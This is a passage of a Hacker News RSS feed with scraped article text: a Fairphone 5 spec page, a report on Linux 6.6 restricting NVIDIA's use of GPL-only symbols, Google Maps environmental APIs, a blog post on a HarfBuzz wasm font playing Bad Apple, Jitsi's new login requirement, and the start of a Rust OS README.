                                            <li>F/2.45 with HDR support</li>
                                            <ul>
                                                <li>Image sensor JN1</li>
                                                <li>1/2.76" sensor, 0,64 um pixel size (“1,28” when pixel binning)</li>
                                                <li>90 degree field of view</li>
                                                <li>Electronic Image Stabilization</li>
                                                <li>Up to 1,5x digital zoom</li>
                                                <li>Video capture 4k at 30fps</li>
                                                <li>Display used as flash</li>
                                            </ul>
                                        </ul>
                                    </div>
                                    <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/092.png" loading="eager">
                                    </p>
                                </div>
                                <div>
                                    <h5>operating system</h5>
                                    <div>
                                        <ul>
                                            <li>Android™ 13</li>
                                        </ul>
                                    </div>
                                </div>
                                <div>
                                    <h5>PERFORMANCE</h5>
                                    <div>
                                        <ul>
                                            <li>Qualcomm QCM 6490</li>
                                            <li>64-bit Octa-Core processor</li>
                                            <li>Processor speed up to 2.7GHz</li>
                                            <li>Qualcomm Adreno 642L @ 812MHz</li>
                                        </ul>
                                    </div>
                                </div>
                                <div>
                                    <h5>STORAGE</h5>
                                    <div>
                                        <ul>
                                            <li>8GB 256GB internal storage</li>
                                            <li>External storage capacity: microSD up to 2TB (SD 3.0)</li>
                                        </ul>
                                    </div>
                                </div>
                                <div>
                                    <h5>BATTERY</h5>
                                    <div>
                                        <p><i></i>
                                            <span>REPLACEABLE</span>
                                        </p>
                                        <ul>
                                            <li>4200mAh removable Li-ion battery</li>
                                            <li>459 hours whilst idle</li>
                                            <li>12 hours with phone calls</li>
                                            <li>50% charge in 30min with minimum 30W charger</li>
                                            <li>Nominal capacity: 4200 mAh</li>
                                            <li>Nominal voltage: 3.87V</li>
                                        </ul>
                                    </div>
                                </div>
                                <div>
                                    <h5>Wireless &amp; location</h5>
                                    <div>
                                        <ul>
                                            <li>Wi-Fi (2.4GHz + 5GHz 6GHz) • Bluetooth® 5.2 + LE</li>
                                            <li>NFC for card payments &amp; more</li>
                                        </ul>
                                    </div>
                                </div>
                                <div>
                                    <h5>Network</h5>
                                    <div>
                                        <ul>
                                            <li>Dual SIM, both 5G enabled (one physical Nano-SIM slot 4FF, 5G enabled and one eSIM, 5G enabled</li>
                                            <li>More Bands and Band-Combinations for better reception</li>
                                        </ul>
                                    </div>
                                </div>
                                <div>
                                    <h5>USB</h5>
                                    <div>
                                        <p><i></i>
                                            <span>REPLACEABLE</span>
                                        </p>
                                        <ul>
                                            <li>USB 3.0 Can be used to connect SD-Card/Camera/Audio Amplifier directly 
                                        </li>
                                        </ul>
                                    </div>
                                </div>
                                <div>
                                    <h5>DURABILITY</h5>
                                    <div>
                                        <ul>
                                            <li>IP 55</li>
                                            <li>Drop Test: ICE 60058-2-31 was passed 1.8m</li>
                                            <li>Military test MIL-810H was passed 1.5m</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
            </section>
            <section data-snippet="s_fp_wwwww_019" data-name="wwwww 019">
                <div>
                            <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/078.png" loading="lazy">
                            </p>
                            <div>
                                <h4>All-day battery life, made fair
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    <br>
                                </h4>
                                <p>Combining all-day power (4200mAh) and fast-charging. Plus, it’s easy to swap when you need it, so you can keep going and going and going. And it’s as fair as batteries get.
                            
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    <br>
                                </p>
                                <ul>
                                    <li>
                                        <i></i>
                                        <p>32 hours of daily use</p>
                                    </li>
                                    <li>
                                        <i></i>
                                        <p>Recharge to 50% in 20 minutes 
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            <br>
                                        </p>
                                    </li>
                                    <li>
                                        <i></i>
                                        <p>Replace it in seconds&nbsp;
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            <br>
                                        </p>
                                    </li>
                                </ul>
                                <p><span data-fp-light-box="light_box_5">
                                    <i></i>
                                    <span>More about our fairest battery</span>
                                </span>
                            </p></div>
                        </div>
                <div id="light_box_5">
                            <h2>Fair battery</h2>
                            <h3>Say hello to our fairest battery yet</h3>
                            <p>By using a system of cobalt credits, 100% of the cobalt used in the battery is matched by cobalt produced under
                            improved
                            working conditions at artisanal and small scale mines. The battery also integrates fair lithium and contains 100% Fairtrade gold in its supply
                            chain, 100% recycled tin solder paste, 80% recycled steel and nickel alloy, and 75% recycled plastics.
                        </p>
                            <p>With a capacity of 4200 mAh and 30W fast-charging, they are built to last all day. Plug in the charger, and you’ll
                            get 50% in
                            20 minutes. Not that you’ll ever worry about your battery running low; you can always swap them out with a spare whenever you want!
                        </p>
                        </div>
            </section>
            <div data-snippet="s_fp_wwwww_020" data-name="wwwww 020">
                    <h2>Make the switch to Fairphone</h2>
                    <div>
                            <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/086.png" loading="lazy">
                            </p>
                            <div>
                                <h4>Switching from iOS or Android is easier than you think</h4>
                                <ul>
                                    <li>
                                        <i></i>
                                        <p>Switch from iOS or Android in no time</p>
                                    </li>
                                    <li>
                                        <i></i>
                                        <p>Securely transfer all your data</p>
                                    </li>
                                    <li>
                                        <i></i>
                                        <p>All of your favorite Google Apps will be right there with you</p>
                                    </li>
                                    <li>
                                        <i></i>
                                        <p>Fairphones work with your devices: PCs, Macbooks, headphones, even iPads</p>
                                    </li>
                                </ul>
                                <p><span>
                                    <span>​</span>
                                </span>
                            </p></div>
                        </div>
                </div>
            <div id="fp_js_whats_in_box" data-snippet="s_fp_wwwww_021" data-name="wwwww 021">
                    <h2>What’s in the box?</h2>
                    <p>Only what you need. If you don’t need it, we don’t include it. It's your choice.</p>
                    <div>
                            <div>
                                <p><span>1</span></p><p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/083.png" loading="lazy">
                                </p>
                                <p><span>Fairphone 5</span>
                            </p></div>
                            <div>
                                <p><span>2</span></p><p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/082.png" loading="lazy">
                                </p>
                                <p><span>Eco-friendly packaging</span>
                            </p></div>
                            <div>
                                <p><span>3</span></p><p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/084.png" loading="lazy">
                                </p>
                                <p><span>Quick-start guide</span>
                            </p></div>
                        </div>
                    
                </div>
            <div data-snippet="s_fp_wwwww_022" data-name="wwwww 022">
                    <h2>Some things are not in the box, and here’s why:</h2>
                    <p>We do not include a 
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        <a href="https://shop.fairphone.com/shop/usb-c-to-usb-c-cable-2-0-20?category=5#attr=">USB Cable</a>, 
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        <a href="https://shop.fairphone.com/shop/dual-port-30-w-charger-eu-6?category=5#attr=" data-bs-original-title="" title="">charger</a> and 
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        <a href="https://shop.fairphone.com/shop/usb-c-to-mini-audio-jack-adapter-3-5mm-18?category=5#attr=" data-bs-original-title="" title="">audio jack
                    adapter
                </a>&nbsp;in this box because chances are, you already have them at home. So, we don’t want to create unnecessary waste by giving you more of what you don’t need. And hey, if you’re missing anything, just have a look at our 
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        <a href="https://shop.fairphone.com/shop/category/accessories-5">accessories</a> section.
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    </p>
                </div>
            <div data-snippet="s_fp_wwwww_023" data-name="wwwww 023">
                        <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/036.png" loading="eager">
                        </p>
                        <h2>Recycle your old phone and save some money.
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            <br>
                        </h2>
                        <p>Do you have an old phone lying in a drawer somewhere? Why not reduce the waste? Find out how much it's worth to see if you're eligible to receive credit.
                            <br>
                        </p>
                        <p><a href="https://shop.fairphone.com/recycle" data-bs-original-title="" title="">Trade in your old phone</a></p><p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/037.png" loading="eager">
                        </p>
                    </div>
            <div data-name="wwwww 025">
                            <h5>FAIRPHONE 5</h5>
                            <p>
                                <span>Designed</span>
                                <span>for you.</span>
                                <span>Made fair.</span>
                            </p>
                            <p><span>€699.00</span>
                            <a href="https://shop.fairphone.com/shop/fairphone-5-273">PRE-ORDER</a>
                        </p></div>
            <div data-snippet="s_fp_home_010" data-name="Home - Awards Quote">
                        <p>
                            <h2>Best in green electronics</h2>
                        </p>
                        <div>
                            <h5>OUR IMPACT</h5>
                            <p>There are more phones than people. And behind every device is a complex supply chain. With suppliers, local
                            communities and the wider industry, we work for fairer materials and more responsible practices. Showing the electronics industry that we can
                            do better.
                        </p>
                            <p>Together we’re disrupting the industry’s short-term thinking that the world can no longer afford. And changing what it means to be “best.”</p>
                        </div>
                    </div>
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Linux 6.6 to Protect Against Illicit Behavior of Nvidia Proprietary Driver (141 pts)]]></title>
            <link>https://www.phoronix.com/news/Linux-6.6-Illicit-NVIDIA-Change</link>
            <guid>37319537</guid>
            <pubDate>Wed, 30 Aug 2023 09:41:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.phoronix.com/news/Linux-6.6-Illicit-NVIDIA-Change">https://www.phoronix.com/news/Linux-6.6-Illicit-NVIDIA-Change</a>, See on <a href="https://news.ycombinator.com/item?id=37319537">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p><img alt="NVIDIA" src="https://www.phoronix.com/assets/categories/nvidia.webp" width="100" height="100"></p><p>
The Linux 6.6 modules infrastructure is changing to better protect against the illicit behavior of NVIDIA's proprietary kernel driver.
</p><p>
Luis Chamberlain sent out the modules changes today for the Linux 6.6 merge window. Most notable with the modules update is a change that better builds up the defenses against NVIDIA's proprietary kernel driver from using GPL-only symbols. Or in other words, bits that only true open-source drivers should be utilizing and not proprietary kernel drivers like NVIDIA's default Linux driver in respecting the original kernel code author's intent.
</p><p>
A <a href="https://github.com/torvalds/linux/commit/262e6ae7081d">change</a> made back in 2020 to the kernel module code inherits the TAINT_PROPRIETARY_MODULE and better protects against proprietary modules using GPL-only symbols following <a href="https://www.phoronix.com/news/Linux-59-Proprietary-Shim-Taint">a NVIDIA GPL condom incident</a>. Well, NVIDIA Linux engineers have since worked around that to be able to use GPL-only symbols within their binary blob. As a result we have new defenses being put in place for the kernel.
</p><p><a href="https://www.phoronix.com/image-viewer.php?id=854&amp;image=phx_beer_d1_lrg" target="_blank"><img src="https://www.phoronix.net/image.php?id=854&amp;image=phx_beer_d1_med" alt="NVIDIA broken cards"></a></p>
<p>Christoph Hellwig who authored the latest defensive measure <a href="https://lore.kernel.org/lkml/20230731083806.453036-6-hch@lst.de/">explained</a>:
</p><blockquote>"It has recently come to my attention that nvidia is circumventing the protection added in 262e6ae7081d ("modules: inherit TAINT_PROPRIETARY_MODULE") by importing exports from their proprietary modules into an allegedly GPL licensed module and then re-exporting them.
<p>
Given that symbol_get was only ever intended for tightly cooperating modules using very internal symbols it is logical to restrict it to being used on EXPORY_SYMBOL_GPL and prevent nvidia from costly DMCA circumvention of access controls lawsuits.
</p><p>
All symbols except for four used through symbol_get were already exported as EXPORT_SYMBOL_GPL, and the remaining four ones were switched over in the preparation patches."</p></blockquote>
<p>This change to only allow symbol_get of EXPORT_SYMBOL_GPL modules will now be in place with Linux 6.6. Luis Chamberlain further added in today's pull request:
</p><blockquote>"Christoph Hellwig's symbol_get() fix to Nvidia's efforts to circumvent the protection he put in place in year 2020 to prevent proprietary modules from using GPL only symbols, and also ensuring proprietary modules which export symbols grandfather their taint. That was done through year 2020 commit 262e6ae7081d ("modules: inherit TAINT_PROPRIETARY_MODULE"). Christoph's new  fix is done by clarifing __symbol_get() was only ever intended to prevent module reference loops by Linux kernel modules and so making it only find symbols exported via EXPORT_SYMBOL_GPL(). The circumvention tactic used by Nvidia was to use symbol_get() to purposely swift through proprietary module symbols and completley bypass our traditional EXPORT_SYMBOL*() annotations and community agreed upon restrictions."</blockquote>
<p>Back in 2020 when the original defense was added, <a href="https://www.phoronix.com/news/NVIDIA-Linux-5.9-Delayed">NVIDIA recommended avoiding the Linux 5.9</a> for the time being. They ended up having a supported driver several weeks later. It will be interesting to see this time how long Linux 6.6+ thwarts their kernel driver. At least NVIDIA is now maintaining their open GPU kernel driver option since last year as an alternative to their proprietary kernel driver.
</p><p>
The full list of modules changes for Linux 6.6 can be found via <a href="https://lore.kernel.org/lkml/ZO5M45JsJYzNF59H@bombadil.infradead.org/">this pull request</a>.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[New Map APIs from Google (114 pts)]]></title>
            <link>https://latlong.blog/2023/08/new-map-apis-from-google.html</link>
            <guid>37319500</guid>
            <pubDate>Wed, 30 Aug 2023 09:35:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://latlong.blog/2023/08/new-map-apis-from-google.html">https://latlong.blog/2023/08/new-map-apis-from-google.html</a>, See on <a href="https://news.ycombinator.com/item?id=37319500">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
  <main>
    <article>
      

      
      
      

      <p>Ahead of Google Cloud Next 23, the company announced new map data sets available through the Google Maps API.</p>

<blockquote>
  <p>Now we’re expanding our sustainability offerings with new products in Google Maps Platform. These products apply AI and machine learning, along with aerial imagery and environmental data, to provide up-to-date information about solar potential, air quality and pollen levels. With this technology, developers, businesses and organizations can build tools that map and mitigate environmental impact.</p>
</blockquote>

<p>The <a href="https://cloud.google.com/blog/products/maps-platform/powering-future-our-new-solar-api">SolarAPI</a> helps building owners and developers estimate potential energy savings by leveraging solar power. Using imagery, LIDAR data and 3D models, the data provides insights on the solar potential of a building and aids the design of solar systems. The data covers 40 countries.</p>

<p>While data from the Solar API can help tackle the causes of climate change, the Air Quality and Pollen APIs help humans mitigate its effects.</p>

<p>Based on a model that takes in land cover, climate data, pollen-production rates from various plant species, the <a href="https://mapsplatform.google.com/maps-products/pollen/">Pollen API</a> provides estimated pollen counts for 15 plant species in 65 countries. The <a href="https://cloud.google.com/blog/products/maps-platform/introducing-air-quality-api-promoting-resilience-changing-climate">Air Quality API</a> combines data from various sources, including “government monitoring stations, sensors, models, meteorological data, satellites, land cover, and live traffic information,” to create a air-quality layer covering 100 countries.</p>


      <p>
        
        <time datetime="2023-08-30T08:33:56+00:00">Wednesday, 30 August 2023</time>
        
        Topic: <a href="https://latlong.blog/archive/data">Data</a>
        
      </p>
    </article>
  </main>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Bad Apple Font (146 pts)]]></title>
            <link>https://blog.erk.dev/posts/anifont/</link>
            <guid>37317055</guid>
            <pubDate>Wed, 30 Aug 2023 02:46:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.erk.dev/posts/anifont/">https://blog.erk.dev/posts/anifont/</a>, See on <a href="https://news.ycombinator.com/item?id=37317055">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <h2 id="introduction">Introduction<a href="#introduction" arialabel="Anchor">⌗</a> </h2>
<p>In this post we explorer the idea to embed a animation into a font. We
do this using the new experimental wasm shaper in Harfbuzz. Any
comments and questions can be sent to
<a href="mailto:blog@erk.dev"></a><a href="mailto:blog@erk.dev">blog@erk.dev</a>.</p>
<h2 id="small-introduction-to-fonts">Small introduction to fonts<a href="#small-introduction-to-fonts" arialabel="Anchor">⌗</a> </h2>
<h2 id="history">History<a href="#history" arialabel="Anchor">⌗</a> </h2>
<p>Standard fonts are a human thing that have been a thing since moveable
type was first invented, and since it is a human thing it gets
complicated fast. A example of this could be the letter thorn (Þ)
which was a letter used in early English. When moveable type became a
thing it was the Y letter (since Þ was not in foreign imported fonts)
leading to the use of things like Ye (as in Ye olde pub) even when Ye
is said in the same way as The. Computer fonts came later and have to
be able to handle much of “technical debt” that have come over
hundreds of years.</p>
<h2 id="ligatures">Ligatures<a href="#ligatures" arialabel="Anchor">⌗</a> </h2>
<p>When handwriting letters often flow together and to emulate that in
moveable types you added new types. For example if you have two
singular “f” types they would have a unnatural large space between
them. So you use a “ff” (ﬀ) ligature to make it seem more natural,
others like this exists for example f and i which becomes the “fi” (ﬁ)
ligature. Some of these ligatures becomes its own symbol at some point
for example ampersand (&amp;) started as a ligature for the latin Et
meaning and. And the Danish letter Æ started as a ligature for A and
E. This is another thing that also has to be emulated by modern
computer fonts. Some ligatures have their own unicode character like A
and E, but you can also add your own ligatures to a font. Some
computer fonts does this for example making <code>-&gt;</code> into a arrow.</p>
<h2 id="harfbuzz">HarfBuzz<a href="#harfbuzz" arialabel="Anchor">⌗</a> </h2>
<p>HarfBuzz is a tool to handle these kind of tranformations and many
others that are in use. It is used by many projects for example
Chromium uses it for its text shaping, which is what this kind (and
other) of transformation is called.</p>
<h2 id="wasm">Wasm<a href="#wasm" arialabel="Anchor">⌗</a> </h2>
<p>I saw the release notes for <a href="https://github.com/harfbuzz/harfbuzz/releases/tag/8.0.0">HarfBuzz
8.0.0</a> which
to my surprise had a new experimental feature that allowed you to use
wasm for the text shaping rules, I already had a bit of experiance
with wasm with the source written in rust as it were in the <a href="https://github.com/harfbuzz/harfbuzz-wasm-examples">examples
they have</a>.</p>
<h2 id="bad-apple">Bad Apple<a href="#bad-apple" arialabel="Anchor">⌗</a> </h2>
<p>At the time of writing Reddits <a href="https://reddit.com/r/place">/r/place</a> is ongoing and a friend
pointed out to me that the <a href="https://reddit.com/r/touhou">/r/touhou</a>
was doing a Bad Apple animation on the canvas. <a href="https://en.wikipedia.org/wiki/Bad_Apple!!#Use_as_a_graphical_and_audio_test">Bad
Apple</a>
is a song that has a shadow puppet animation that have been used for
demos for many years so you sometimes see it show up in odd places. I
said to my friend I probably could put it into a font, so that is what
I did.</p>
<h2 id="creating-the-font">Creating the font<a href="#creating-the-font" arialabel="Anchor">⌗</a> </h2>
<h2 id="step-1-getting-the-frames">Step 1: Getting the frames.<a href="#step-1-getting-the-frames" arialabel="Anchor">⌗</a> </h2>
<p>The first step on my jouney was to get every single frame as a SVG so
I could put it into a font. I was lucky to spot the repository
<a href="https://github.com/Eiim/SmilApple">SmllApple</a> which contains
instructions to generate svg files of every frame. I follow the
instructions, but the <code>svgo</code> to optimize the SVG files caused some
errors in a later step so I had to skip that.</p>
<h2 id="step-2-getting-the-frames-into-a-font">Step 2: Getting the frames into a font.<a href="#step-2-getting-the-frames-into-a-font" arialabel="Anchor">⌗</a> </h2>
<p>Unicode has a some codepoints that should not be used for normal
characters as they are concidered private, these are called <a href="https://en.wikipedia.org/wiki/Private_Use_Areas">Private
Use Areas</a>.
I decided to put my fonts in the first large one as the smaller one
could not fit all frames.</p>
<p>I found a guide about how to go around doing that Which was very
usefull.</p>
<p><a href="https://leifgehrmann.com/2019/04/28/creating-fonts-from-svg/">https://leifgehrmann.com/2019/04/28/creating-fonts-from-svg/</a></p>
<p>I had a quick look around for a small font that had a SFD file and
found
<a href="https://github.com/Automattic/node-canvas/tree/master/examples/pfennigFont">Pfennig</a>
which became a base for the rest of the guide.</p>
<p>I followed most of the instructions about the SVG file import I had to
make small modifications in the script that ran inkscape since
inkscape have changed its interface recently, but otherwise everything
went to plan. I made a small script that changed the name of each
frame to the unicode character I wanted to to be. So for example the
filed called “2058.svg” would be renamed to “󰠊.svg”. This meant I
could use the last part of the guide and it all seemed to work.</p>
<h2 id="step-3-getting-the-shaping-to-work">Step 3: Getting the shaping to work.<a href="#step-3-getting-the-shaping-to-work" arialabel="Anchor">⌗</a> </h2>
<p>I based my code on the calculator example in the <a href="https://github.com/harfbuzz/harfbuzz-wasm-examples">example
repository</a> which
made it quite easy to modify to get the goal I wanted.</p>
<p>My code would simply look for the first run of <code>.</code> in a text snippert
and replace it with the given bad apple frame.</p>



  <div>
    <p>
    <label for="1">
      <span>rust</span>
      <span>Full code for character replacement</span>
      <span data-label-expand="Show" data-label-collapse="Hide"></span>
    </label></p><pre><code>
use harfbuzz_wasm::{debug, Font, Glyph, GlyphBuffer};
use wasm_bindgen::prelude::*;

#[wasm_bindgen]
pub fn shape(
    _shape_plan: u32,
    font_ref: u32,
    buf_ref: u32,
    _features: u32,
    _num_features: u32,
) -&gt; i32 {
    let font = Font::from_ref(font_ref);
    let mut buffer = GlyphBuffer::from_ref(buf_ref);
    // Get buffer as string
    let buf_u8: Vec&lt;u8&gt; = buffer.glyphs.iter().map(|g| g.codepoint as u8).collect();
    let str_buf = String::from_utf8_lossy(&amp;buf_u8);

    let dot_cnt = str_buf.chars().filter(|c| *c == '.').count() as u32;
    if dot_cnt &gt; 0 {
        debug(&amp;format!("dot count: {}", dot_cnt));

        let first_dot = str_buf.as_bytes().iter().position(|c| *c == b'.').unwrap();
	debug(&amp;format!("First dot: {first_dot}"));
        let run_length = str_buf[first_dot..]
            .as_bytes()
            .iter()
            .position(|c| *c != b'.')
            .unwrap_or_else(|| str_buf[first_dot..].as_bytes().len()) as u32;
	debug(&amp;format!("Run length: {run_length}"));
	
        const OFFSET: u32 = 0xF0000;
        const FRAMES: u32 = 6573;
        const END: u32 = OFFSET + 6537;

        let glyph = if run_length &gt; END {
            "FIN.".to_string()
        } else {
            char::from_u32(run_length - 1 + OFFSET).unwrap().to_string()
        };
	let before = &amp;str_buf[..first_dot];
	let after = &amp;str_buf[first_dot + (run_length as usize)..];
        let res_str = format!("{before}{glyph}{after}");
	debug(&amp;res_str);
        buffer.glyphs = res_str
            .chars()
            .enumerate()
            .map(|(ix, x)| Glyph {
                codepoint: x as u32,
                flags: 0,
                x_advance: 0,
                y_advance: 0,
                cluster: ix as u32,
                x_offset: 0,
                y_offset: 0,
            })
            .collect();
    } else {
        debug("No match");
        debug(&amp;str_buf);
    }

    for item in buffer.glyphs.iter_mut() {
        // Map character to glyph
        item.codepoint = font.get_glyph(item.codepoint, 0);
        // Set advance width
        item.x_advance = font.get_glyph_h_advance(item.codepoint);
    }
    // Buffer is written back to HB on drop
    1
}
</code></pre>
  </div>


<p>Then I used the same makefile with some small adjustments to generate
my font.</p>
<h2 id="step-4-the-video">Step 4: The Video.<a href="#step-4-the-video" arialabel="Anchor">⌗</a> </h2>
<p>Bad Apple!! is a 30fps video so I used <code>xset</code> to set the repeating
frequency of letters to 30Hz, then I went looking for a HarfBuzz based
tool. I ended up landing on Gimp as that was the easiest to get
working. I installed a patched version of HarfBuzz-git from AUR to
enable WASM and off I went recording with OBS, in post I dubbed the
original music as well, and it ended up being nicely timed.</p>
<h2 id="conclusion">Conclusion<a href="#conclusion" arialabel="Anchor">⌗</a> </h2>
<p>I posted a
<a href="https://twitter.com/valdemarerk/status/1682715181854367744">tweet</a>
and a <a href="https://www.youtube.com/watch?v=GF2sn2DXjlA">YouTube video</a> to
show it off.</p>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Authentication on meet.jit.si (170 pts)]]></title>
            <link>https://jitsi.org/blog/authentication-on-meet-jit-si/</link>
            <guid>37316959</guid>
            <pubDate>Wed, 30 Aug 2023 02:31:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jitsi.org/blog/authentication-on-meet-jit-si/">https://jitsi.org/blog/authentication-on-meet-jit-si/</a>, See on <a href="https://news.ycombinator.com/item?id=37316959">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
				<p><span><strong>Blog</strong></span></p>
				
				<h2><span>What’s going on?</span></h2>
<p><span>Starting on August 24th, we will no longer support the anonymous creation of rooms on meet.jit.si, and will require the use of an account (we will be supporting Google, GitHub and Facebook for starters but may modify the list later on). This is a first for us, so users may encounter a few bumps here and there as we are tweaking the experience to make sure there is as little friction as possible on the way into a meeting.&nbsp;</span></p>
<h2><span>Why make a change?</span></h2>
<p><span>When we started the service back in 2013, our goal was to offer a meeting experience with as little friction and as much privacy as possible. We felt and still feel that both of these goals are very important and one of the main reasons that justified the existence of “yet another meeting service.” We wanted people to be able to converse easily and freely, without fear of expressing their views and opinions.</span></p>
<p><span>Our “one tap and you’re in” experience was a big part of our strategy to eliminate friction. We didn’t want people to have to worry about “creating” meetings in advance, remembering passwords, codes or long complicated sequences of numbers for a meeting ID. We wanted users to be able to think of a name and just go there. Through the years we’ve had to compromise on this a little bit. We ended up introducing a pre-meeting device check screen. We felt that checking your camera and microphone before you entered a room could save everyone some hassle so it was worth the pause.&nbsp;</span></p>
<p><span>As for privacy, we previously made sure all communication was always encrypted and we retained no data beyond what is necessary to actually provide a decent meeting service.&nbsp;</span></p>
<p><span>Offering the possibility to anonymously use the service felt like a good way to help with both its privacy and the usability.</span></p>
<p><span>Our commitment to both goals remains as strong as ever but anonymity is no longer going to be one of the tools we use to achieve them.</span></p>
<p><span>Earlier this year we saw an increase in the number of reports we received about some people using our service in ways that we cannot tolerate. To be more clear, this was not about some people merely saying things that others disliked.&nbsp;</span></p>
<p><span>Over the past several months we tried multiple strategies in order to end the violations of our terms of service. However in the end, we determined that requiring authentication was a necessary step to continue operating meet.jit.si.</span></p>
<h2><span>How does this impact user privacy on meet.jit.si?&nbsp;</span></h2>
<p><span>It is a good time to have a look at our </span><a href="https://jitsi.org/meet/privacy"><span>privacy terms</span></a><span>. 8×8 will now store the account responsible for creating rooms. Aside from the changes to our privacy terms referenced above, there is no other change to our meetings. We are still very much committed to holding user privacy in the highest regard and we still have no tools that would allow us to compromise the privacy of the actual audio or video content of a meeting, nor do we intend to create any.</span></p>
<p><span>That said, it is completely understandable that some users may feel uncomfortable using an account to access the service. For such cases we strongly recommend </span><a href="https://jitsi.github.io/handbook/docs/devops-guide/"><span>hosting your own deployment of Jitsi Meet.</span></a><span> We spend a lot of effort to keep that a very simple process and this has always been the mode of use that gives people the highest degree of privacy.</span></p>
<p><span>If you see content that violates the jit.si terms of service you can always </span><a href="https://github.com/jitsi/jitsi-meet/blob/master/SECURITY.md"><span>report it</span></a><span>.</span></p>
<p><span>That’s all we’ve got for now!</span></p>
<p><span>The Jitsi Team</span></p>

							</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Discovery of spherules of likely extrasolar composition in the Pacific Ocean [pdf] (171 pts)]]></title>
            <link>https://lweb.cfa.harvard.edu/~loeb/Interstellar_Expedition.pdf</link>
            <guid>37316831</guid>
            <pubDate>Wed, 30 Aug 2023 02:12:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lweb.cfa.harvard.edu/~loeb/Interstellar_Expedition.pdf">https://lweb.cfa.harvard.edu/~loeb/Interstellar_Expedition.pdf</a>, See on <a href="https://news.ycombinator.com/item?id=37316831">Hacker News</a></p>
&lt;Not HTML&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Fomos: Experimental OS, built with Rust (317 pts)]]></title>
            <link>https://github.com/Ruddle/Fomos</link>
            <guid>37316309</guid>
            <pubDate>Wed, 30 Aug 2023 01:00:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/Ruddle/Fomos">https://github.com/Ruddle/Fomos</a>, See on <a href="https://news.ycombinator.com/item?id=37316309">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">Fomos</h2>
<p dir="auto">Experimental OS, built with Rust</p>
<details open="">
  <summary>
    
    <span aria-label="Video description output.mp4">output.mp4</span>
    <span></span>
  </summary>

  <video src="https://user-images.githubusercontent.com/14235713/264029518-3ee75d5e-5ebe-4cc1-b267-8b73337ee157.mp4" data-canonical-src="https://user-images.githubusercontent.com/14235713/264029518-3ee75d5e-5ebe-4cc1-b267-8b73337ee157.mp4" controls="controls" muted="muted">

  </video>
</details>

<p dir="auto"><strong>Fun fact</strong>: there are 3 apps running in the video. A background app, a cursor app, and a console app.</p>
<h2 tabindex="-1" dir="auto">Why</h2>
<p dir="auto">I wanted to experiment with Non-Unix OS ideas.</p>
<p dir="auto">Exo-kernels are interesting, but it is mostly a theory. This project helps me understand the challenges involved in that pattern.</p>
<p dir="auto">OS development is extremely hard, Rust makes it more bearable.</p>
<h2 tabindex="-1" dir="auto">Features</h2>
<ul dir="auto">
<li>Has a graphical output</li>
<li>Dynamic allocation</li>
<li>Load and run concurrent apps</li>
<li>All apps run in an async loop</li>
<li>Support Virtio mouse and keyboard (drivers are async tasks)</li>
<li>Cooperative scheduling (apps yield control as much as possible)</li>
<li>No context switches once booted</li>
<li><em>Nearly support Virgl</em> ™</li>
</ul>
<p dir="auto">There is 5 examples of apps in this repo named <code>app_*</code>, some in Rust, one in C.
The kernel is in <code>bootloader</code>.</p>
<h2 tabindex="-1" dir="auto">What is unique</h2>
